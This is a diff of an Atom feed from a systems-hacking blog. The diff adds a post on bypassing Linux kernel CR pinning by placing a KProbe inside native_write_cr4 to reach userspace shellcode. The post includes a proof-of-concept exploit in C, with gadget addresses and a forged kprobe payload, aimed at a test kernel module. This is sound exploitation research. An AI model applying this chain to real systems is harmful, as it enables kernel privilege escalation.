@@ -1,4 +1,185 @@
-<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="4.3.2">Jekyll</generator><link href="https://zolutal.github.io/feed.xml" rel="self" type="application/atom+xml" /><link href="https://zolutal.github.io/" rel="alternate" type="text/html" /><updated>2025-10-08T06:30:07+00:00</updated><id>https://zolutal.github.io/feed.xml</id><title type="html">zolutal’s blog</title><subtitle>systems hacking</subtitle><author><name>Jennifer Miller</name></author><entry><title type="html">Securinets Quals 2025: Sukunahikona (v8 Exploitation)</title><link href="https://zolutal.github.io/securinets-sukunahikona/" rel="alternate" type="text/html" title="Securinets Quals 2025: Sukunahikona (v8 Exploitation)" /><published>2025-10-07T00:00:00+00:00</published><updated>2025-10-07T00:00:00+00:00</updated><id>https://zolutal.github.io/securinets-sukunahikona</id><content type="html" xml:base="https://zolutal.github.io/securinets-sukunahikona/"><![CDATA[<p>I played Securinets Quals this weekend with Shellphish; we ended up placing 7th, qualifying us for finals! When I logged on to play, all of the released pwn was already solved or close to solved by @vy, except for the v8 challenge. Despite having never touched v8 pwn before, I decided to give it a go, and I managed to solve it. This is my writeup for that challenge :)</p>
+<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="4.3.2">Jekyll</generator><link href="https://zolutal.github.io/feed.xml" rel="self" type="application/atom+xml" /><link href="https://zolutal.github.io/" rel="alternate" type="text/html" /><updated>2026-02-11T17:25:33+00:00</updated><id>https://zolutal.github.io/feed.xml</id><title type="html">zolutal’s blog</title><subtitle>systems hacking</subtitle><author><name>Jennifer Miller</name></author><entry><title type="html">Revisiting Two-Shot Kernel Shellcode Execution From Control Flow Hijacking</title><link href="https://zolutal.github.io/two-shot-kernel-shellcode/" rel="alternate" type="text/html" title="Revisiting Two-Shot Kernel Shellcode Execution From Control Flow Hijacking" /><published>2026-02-10T00:00:00+00:00</published><updated>2026-02-10T00:00:00+00:00</updated><id>https://zolutal.github.io/two-shot-kernel-shellcode</id><content type="html" xml:base="https://zolutal.github.io/two-shot-kernel-shellcode/"><![CDATA[<p>One of the inspirations for my work on the <a href="https://www.usenix.org/system/files/usenixsecurity25-miller.pdf">System Register Hijacking</a> paper was <a href="https://projectzero.google/2017/05/exploiting-linux-kernel-via-packet.html">this blog post</a> by Project Zero written by Andrey Konovalov.
+In the blog post he describes a method of bypassing SMEP/SMAP by using the <code class="language-plaintext highlighter-rouge">native_write_cr4</code> function of the kernel, which at the time effectively did <code class="language-plaintext highlighter-rouge">mov cr4, rdi; ret;</code>.
+He redirects control flow to <code class="language-plaintext highlighter-rouge">native_write_cr4</code> once to disable SMEP/SMAP then triggers control flow hijacking a second time to execute userspace shellcode.</p>
+
+<p>Following that blog post a mitigation was introduced into the Linux that is commonly referred to as “CR Pinning”.
+Essentially, it is a mitigation that modifies the way the <code class="language-plaintext highlighter-rouge">native_write_cr[0,4]</code> functions are structured to prevent the kind of misuse shown off by the blog post.</p>
+
+<p>Currently the <code class="language-plaintext highlighter-rouge">native_write_cr4</code> function looks like this:</p>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">static</span> <span class="k">const</span> <span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">cr4_pinned_mask</span> <span class="o">=</span> <span class="n">X86_CR4_SMEP</span> <span class="o">|</span> <span class="n">X86_CR4_SMAP</span> <span class="o">|</span> <span class="n">X86_CR4_UMIP</span> <span class="o">|</span>
+					     <span class="n">X86_CR4_FSGSBASE</span> <span class="o">|</span> <span class="n">X86_CR4_CET</span> <span class="o">|</span> <span class="n">X86_CR4_FRED</span><span class="p">;</span>
+<span class="k">static</span> <span class="nf">DEFINE_STATIC_KEY_FALSE_RO</span><span class="p">(</span><span class="n">cr_pinning</span><span class="p">);</span>
+<span class="k">static</span> <span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">cr4_pinned_bits</span> <span class="n">__ro_after_init</span><span class="p">;</span>
+
+<span class="p">...</span>
+
+<span class="kt">void</span> <span class="n">__no_profile</span> <span class="nf">native_write_cr4</span><span class="p">(</span><span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">val</span><span class="p">)</span>
+<span class="p">{</span>
+	<span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">bits_changed</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+
+<span class="nl">set_register:</span>
+	<span class="n">asm</span> <span class="k">volatile</span><span class="p">(</span><span class="s">"mov %0,%%cr4"</span><span class="o">:</span> <span class="s">"+r"</span> <span class="p">(</span><span class="n">val</span><span class="p">)</span> <span class="o">:</span> <span class="o">:</span> <span class="s">"memory"</span><span class="p">);</span>
+
+	<span class="k">if</span> <span class="p">(</span><span class="n">static_branch_likely</span><span class="p">(</span><span class="o">&amp;</span><span class="n">cr_pinning</span><span class="p">))</span> <span class="p">{</span>
+		<span class="k">if</span> <span class="p">(</span><span class="n">unlikely</span><span class="p">((</span><span class="n">val</span> <span class="o">&amp;</span> <span class="n">cr4_pinned_mask</span><span class="p">)</span> <span class="o">!=</span> <span class="n">cr4_pinned_bits</span><span class="p">))</span> <span class="p">{</span>
+			<span class="n">bits_changed</span> <span class="o">=</span> <span class="p">(</span><span class="n">val</span> <span class="o">&amp;</span> <span class="n">cr4_pinned_mask</span><span class="p">)</span> <span class="o">^</span> <span class="n">cr4_pinned_bits</span><span class="p">;</span>
+			<span class="n">val</span> <span class="o">=</span> <span class="p">(</span><span class="n">val</span> <span class="o">&amp;</span> <span class="o">~</span><span class="n">cr4_pinned_mask</span><span class="p">)</span> <span class="o">|</span> <span class="n">cr4_pinned_bits</span><span class="p">;</span>
+			<span class="k">goto</span> <span class="n">set_register</span><span class="p">;</span>
+		<span class="p">}</span>
+		<span class="cm">/* Warn after we've corrected the changed bits. */</span>
+		<span class="n">WARN_ONCE</span><span class="p">(</span><span class="n">bits_changed</span><span class="p">,</span> <span class="s">"pinned CR4 bits changed: 0x%lx!?</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span>
+			  <span class="n">bits_changed</span><span class="p">);</span>
+	<span class="p">}</span>
+<span class="p">}</span>
+</code></pre></div></div>
+
+<p>There is a global which specifies the pinned values of the register <code class="language-plaintext highlighter-rouge">cr4_pinned_bits</code> and a mask the specifies which bits of the register are affected by the <code class="language-plaintext highlighter-rouge">CR Pinning</code> mitigation.
+if you attempt to hijack control flow to this function, the cr4 register will be overwritten but then the following code will reset the values of the pinned bits according to the <code class="language-plaintext highlighter-rouge">cr4_pinned_bits</code> global.</p>
+
+<p>While I was working on <a href="https://www.usenix.org/system/files/usenixsecurity25-miller.pdf">System Register Hijacking</a>, we did find a pretty clean gadget for writing cr4 elsewhere in the kernel, in <code class="language-plaintext highlighter-rouge">sev_modify_cbit</code>:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&lt;sev_verify_cbit+69&gt;:	mov    cr4,rsi
+&lt;sev_verify_cbit+72&gt;:	je     0xffffffff810003f7 &lt;sev_verify_cbit+87&gt;
+&lt;sev_verify_cbit+74&gt;:	xor    rsp,rsp
+&lt;sev_verify_cbit+77&gt;:	sub    rsp,0x1000
+&lt;sev_verify_cbit+84&gt;:	hlt
+&lt;sev_verify_cbit+85&gt;:	jmp    0xffffffff810003f4 &lt;sev_verify_cbit+84&gt;
+&lt;sev_verify_cbit+87&gt;:	mov    rax,rdi
+&lt;sev_verify_cbit+90&gt;:	jmp    0xffffffff82142cc0 &lt;srso_alias_return_thunk&gt;
+</code></pre></div></div>
+
+<p>Assuming the flags register is in the correct state you effectively get a <code class="language-plaintext highlighter-rouge">mov cr4, rsi; mov rax, rdi; ret;</code> from this function.
+Which is pretty good, but the requirement on the flags register for taking the conditional jump kind of sucks, it means there are some callsites it just won’t work from unless you get ROP first and modify the flags.</p>
+
+<p>So I started wondering, is there another way of getting around the <code class="language-plaintext highlighter-rouge">CR Pinning</code> mitigation?</p>
+
+<h1 id="mind-the-gap">Mind The Gap</h1>
+
+<p>The CR Pinning mitigation is… honestly kind of a strange one.
+You are actually able to overwrite cr4 but then it sets it back to the original value several instructions later.
+Though, I don’t think there is a better way to implement the mitigation, if you have a <code class="language-plaintext highlighter-rouge">mov cr4, r..</code> instruction anywhere in the kernel then architecturally you can’t really stop someone from hijacking control flow to it (CFI aside, I suppose).
+So doing this fixup after the write occurs is about the best that can be done.</p>
+
+<p>But it is still really interesting to me that there is a “gap” between you overwriting cr4 and it being fixed.
+In theory the kernel could even be preempted by a timer interrupt in the middle of that gap and execute other code while using a hijacked cr4 value before continuing to the code that sets the pinned bits.</p>
+
+<p>The preemption case depends on a very tight window though, given how few instructions are in that gap, making it impractical to use.</p>
+
+<p>But what if there was a way to reliably run code in that window?</p>
+
+<h1 id="kprobing">KProbing</h1>
+
+<p>As it turns out the kernel has an API called <a href="https://docs.kernel.org/trace/kprobes.html">KProbes</a> that allows a breakpoint instruction to be inserted into kernel code at run time for tracing reasons, and provided handler functions will be called before and after stepping over the breakpoint. This API is privilleged, but assuming we have control flow hijacking though we can just call it directly.</p>
+
+<p>The API is pretty simple, you can register a kprobe via the <code class="language-plaintext highlighter-rouge">register_kprobe</code> function, which takes one argument <code class="language-plaintext highlighter-rouge">struct kprobe *</code>.
+The kprobe struct has a field for setting the address you want the breakpoint on (alternatively, you can provide a symbol name and an offset), as well as the addresses for the <code class="language-plaintext highlighter-rouge">pre_handler</code> and <code class="language-plaintext highlighter-rouge">post_handler</code> callbacks.</p>
+
+<p>If we register a KProbe in the middle of the <code class="language-plaintext highlighter-rouge">native_write_cr4</code> “gap”, we can set the pre or post handler function to a usermode address and control flow will be redirected to userspace before the cr4 value gets fixed up.</p>
+
+<h1 id="arguments">Arguments</h1>
+
+<p>Though to call <code class="language-plaintext highlighter-rouge">register_kprobe</code> we need control over rdi and we need the ability to forge a <code class="language-plaintext highlighter-rouge">struct kprobe</code> somewhere in kernel memory.</p>
+
+<p>For rdi control there might be some heap allocated function table that gives you control of rdi, but I’m not aware of one. It is pretty common to control rsi though, and after looking for a bit I found there is a function called <code class="language-plaintext highlighter-rouge">devm_action_release</code> that is effectively a <code class="language-plaintext highlighter-rouge">mov rdi, [rsi]; mov rax, [rsi+0x8]; call rax;</code> gadget.
+So assuming we can put an rdi and rip value somewhere in memory, we can point rsi at it and call this function to obtain rdi control.</p>
+
+<p>Thankfully there are known ways of getting controlled data at known (or inferrable) locations in the kernel.
+One of which is to just spray mmap pages, side channel physmap base, and guess an address relative to physmap base where an mmap page might be.
+Another option is to use the <a href="https://github.com/n132/security-research/blob/6a09081d502e4a95011d63cb2b58fa0b21b3028b/pocs/linux/kernelctf/CVE-2025-38477_cos/docs/novel-techniques.md#leave-payload-next-to-kernel-resource-nperm">NPerm</a> technique found by n132, which allows you to get data relative to the kernel image.</p>
+
+<h1 id="draw-the-rest-of-the-owl">Draw the Rest of the Owl</h1>
+
+<p>So given that we can redirect control flow in the middle of <code class="language-plaintext highlighter-rouge">native_write_cr4</code> (you could also target <code class="language-plaintext highlighter-rouge">sev_verify_cbit</code>), all thats left is to put it together.
+I PoC’d it out with a kernel module, but the same idea could be applied to an actual exploit.</p>
+
+<p>The ioctl command hijacks control flow with two arguments according to the <code class="language-plaintext highlighter-rouge">arb_call_req</code> struct provided as an argument.
+The first argument is set to 0xdeadbeef in both cases because I didn’t want to assume rdi control.</p>
+
+<p>The complete PoC can be found <a href="/assets/two-shot-shellcode/exploit/exploit.c">here</a>, but here is the main logic of it:</p>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">// used by devm_action_release gadget</span>
+<span class="k">struct</span> <span class="n">pc_arg</span> <span class="p">{</span>
+    <span class="n">u64</span> <span class="n">a0</span><span class="p">;</span>
+    <span class="n">u64</span> <span class="n">pc</span><span class="p">;</span>
+<span class="p">};</span>
+
+<span class="k">struct</span> <span class="n">nperm_payload</span> <span class="p">{</span>
+    <span class="k">struct</span> <span class="n">kprobe</span> <span class="n">kp</span><span class="p">;</span>
+    <span class="k">struct</span> <span class="n">pc_arg</span> <span class="n">pa1</span><span class="p">;</span>
+    <span class="k">struct</span> <span class="n">pc_arg</span> <span class="n">pa2</span><span class="p">;</span>
+<span class="p">};</span>
+
+<span class="c1">// Control flow returns here</span>
+<span class="kt">void</span> <span class="nf">from_kernel</span><span class="p">()</span> <span class="p">{</span>
+    <span class="kt">int</span> <span class="n">uid</span> <span class="o">=</span> <span class="n">getuid</span><span class="p">();</span>
+    <span class="kt">char</span> <span class="n">flag</span><span class="p">[</span><span class="mh">0x20</span><span class="p">]</span> <span class="o">=</span> <span class="p">{</span><span class="mi">0</span><span class="p">};</span>
+    <span class="kt">int</span> <span class="n">flag_fd</span> <span class="o">=</span> <span class="n">open</span><span class="p">(</span><span class="s">"/flag"</span><span class="p">,</span> <span class="n">O_RDONLY</span><span class="p">);</span>
+    <span class="n">read</span><span class="p">(</span><span class="n">flag_fd</span><span class="p">,</span> <span class="n">flag</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">flag</span><span class="p">));</span>
+    <span class="n">write</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="n">flag</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">flag</span><span class="p">));</span>
+
+    <span class="k">while</span> <span class="p">(</span><span class="mi">1</span><span class="p">)</span> <span class="p">{}</span>
+<span class="p">}</span>
+
+<span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span> <span class="o">**</span><span class="n">argv</span><span class="p">)</span> <span class="p">{</span>
+    <span class="k">struct</span> <span class="n">arb_call_req</span> <span class="n">req</span><span class="p">;</span>
+    <span class="n">u64</span> <span class="n">kaslr_base</span> <span class="o">=</span> <span class="mh">0xffffffff81000000</span><span class="p">;</span>
+    <span class="n">u32</span> <span class="n">dbg</span> <span class="o">=</span> <span class="n">open</span><span class="p">(</span><span class="s">"/proc/dbg-mod"</span><span class="p">,</span> <span class="mi">2</span><span class="p">);</span>
+
+    <span class="n">sandbox</span><span class="p">();</span>
+    <span class="n">save_state</span><span class="p">();</span>
+
+    <span class="c1">// address of some controlled data placed by nperm.</span>
+    <span class="n">u64</span> <span class="n">nperm_addr_guess</span> <span class="o">=</span> <span class="mh">0xffffffff84c11000</span><span class="p">;</span>
+
+    <span class="k">struct</span> <span class="n">nperm_payload</span> <span class="n">payload</span> <span class="o">=</span> <span class="p">{</span>
+        <span class="p">.</span><span class="n">kp</span> <span class="o">=</span> <span class="p">{</span>
+            <span class="p">.</span><span class="n">addr</span> <span class="o">=</span> <span class="p">(</span><span class="kt">void</span> <span class="o">*</span><span class="p">)</span><span class="mh">0xffffffff8107220e</span><span class="p">,</span> <span class="c1">// in the middle of `native_write_cr4`</span>
+            <span class="p">.</span><span class="n">pre_handler</span> <span class="o">=</span> <span class="n">escalate_privs</span><span class="p">,</span> <span class="c1">// userspace shellcode</span>
+            <span class="p">.</span><span class="n">post_handler</span> <span class="o">=</span> <span class="p">(</span><span class="kt">void</span> <span class="o">*</span><span class="p">)</span><span class="mh">0xdeadbeefcafeb0ba</span><span class="p">,</span>
+        <span class="p">},</span>
+        <span class="p">.</span><span class="n">pa1</span> <span class="o">=</span> <span class="p">{</span>
+            <span class="p">.</span><span class="n">pc</span> <span class="o">=</span> <span class="mh">0xffffffff812542d0</span><span class="p">,</span> <span class="c1">// register_kprobe</span>
+            <span class="p">.</span><span class="n">a0</span> <span class="o">=</span> <span class="n">nperm_addr_guess</span><span class="p">,</span>
+        <span class="p">},</span>
+        <span class="p">.</span><span class="n">pa2</span> <span class="o">=</span> <span class="p">{</span>
+            <span class="p">.</span><span class="n">pc</span> <span class="o">=</span> <span class="mh">0xffffffff81072200</span><span class="p">,</span> <span class="c1">// native_write_cr4</span>
+            <span class="p">.</span><span class="n">a0</span> <span class="o">=</span> <span class="mh">0x450ef0</span><span class="p">,</span> <span class="c1">// PKE OSXSAVE FSGSBASE UMIP OSXMMEXCPT OSFXSR PGE MCE PAE PSE</span>
+        <span class="p">},</span>
+    <span class="p">};</span>
+
+    <span class="n">nperm</span><span class="p">(</span><span class="o">&amp;</span><span class="n">payload</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">payload</span><span class="p">));</span>
+
+    <span class="c1">// gadget to get control of rdi</span>
+    <span class="n">u64</span> <span class="n">devm_action_release</span> <span class="o">=</span> <span class="mh">0xffffffff81b24770</span><span class="p">;</span>
+
+    <span class="n">req</span><span class="p">.</span><span class="n">pc</span> <span class="o">=</span> <span class="n">devm_action_release</span><span class="p">;</span>
+    <span class="n">req</span><span class="p">.</span><span class="n">a0</span> <span class="o">=</span> <span class="mh">0xdeadbeef</span><span class="p">;</span>
+    <span class="n">req</span><span class="p">.</span><span class="n">a1</span> <span class="o">=</span> <span class="n">nperm_addr_guess</span> <span class="o">+</span> <span class="n">offsetof</span><span class="p">(</span><span class="k">struct</span> <span class="n">nperm_payload</span><span class="p">,</span> <span class="n">pa1</span><span class="p">);</span>
+    <span class="n">ioctl</span><span class="p">(</span><span class="n">dbg</span><span class="p">,</span> <span class="mi">1337</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">req</span><span class="p">);</span>
+
+    <span class="n">req</span><span class="p">.</span><span class="n">pc</span> <span class="o">=</span> <span class="n">devm_action_release</span><span class="p">;</span>
+    <span class="n">req</span><span class="p">.</span><span class="n">a0</span> <span class="o">=</span> <span class="mh">0xdeadbeef</span><span class="p">;</span>
+    <span class="n">req</span><span class="p">.</span><span class="n">a1</span> <span class="o">=</span> <span class="n">nperm_addr_guess</span> <span class="o">+</span> <span class="n">offsetof</span><span class="p">(</span><span class="k">struct</span> <span class="n">nperm_payload</span><span class="p">,</span> <span class="n">pa2</span><span class="p">);</span>
+    <span class="n">ioctl</span><span class="p">(</span><span class="n">dbg</span><span class="p">,</span> <span class="mi">1337</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">req</span><span class="p">);</span>
+
+    <span class="c1">// Control flow continues in from_kernel()</span>
+
+    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+<span class="p">}</span>
+</code></pre></div></div>
+
+<h1 id="conclusion">Conclusion</h1>
+
+<p>I think getting shellcode execution is one of those things in both kernel and userspace that is fun to achieve just because being able to run arbitrary code very completely “owns” the system/program.
+This technique manages to achieve shellcode execution in the same number of ‘control flow hijacks’ as the old 2017 blog post while going through the same function, and I think that’s neat.</p>
+
+<p>In theory there are other places this KProbe idea could be applied to, any series of instructions can become a gadget by placing a KProbe immediately after it and using the callbacks to chain it to another code location.
+Unfortunately, the KProbe callback functions run with the original register state stored in <code class="language-plaintext highlighter-rouge">pt_regs</code> limiting the effectiveness of chaining multiple kprobes together as a kind of KProbe Oriented Programming (KPOP?).
+It could still be possible to use percpu variables or other non-register means to store the results of computations, so don’t give up on KPOP yet :p</p>
+
+<p>This was kind of just a silly idea I wanted to explore, but I learned a lot about KProbes and got to use NPerm for the first time.
+Anyways, thanks for reading, I hope you learned something from this too!</p>]]></content><author><name>Jennifer Miller</name></author><category term="Exploitation" /><category term="Linux" /><summary type="html"><![CDATA[One of the inspirations for my work on the System Register Hijacking paper was this blog post by Project Zero written by Andrey Konovalov. In the blog post he describes a method of bypassing SMEP/SMAP by using the native_write_cr4 function of the kernel, which at the time effectively did mov cr4, rdi; ret;. He redirects control flow to native_write_cr4 once to disable SMEP/SMAP then triggers control flow hijacking a second time to execute userspace shellcode.]]></summary></entry><entry><title type="html">Securinets Quals 2025: Sukunahikona (v8 Exploitation)</title><link href="https://zolutal.github.io/securinets-sukunahikona/" rel="alternate" type="text/html" title="Securinets Quals 2025: Sukunahikona (v8 Exploitation)" /><published>2025-10-07T00:00:00+00:00</published><updated>2025-10-07T00:00:00+00:00</updated><id>https://zolutal.github.io/securinets-sukunahikona</id><content type="html" xml:base="https://zolutal.github.io/securinets-sukunahikona/"><![CDATA[<p>I played Securinets Quals this weekend with Shellphish; we ended up placing 7th, qualifying us for finals! When I logged on to play, all of the released pwn was already solved or close to solved by @vy, except for the v8 challenge. Despite having never touched v8 pwn before, I decided to give it a go, and I managed to solve it. This is my writeup for that challenge :)</p>
 
 <p>Here is the challenge description:</p>
 
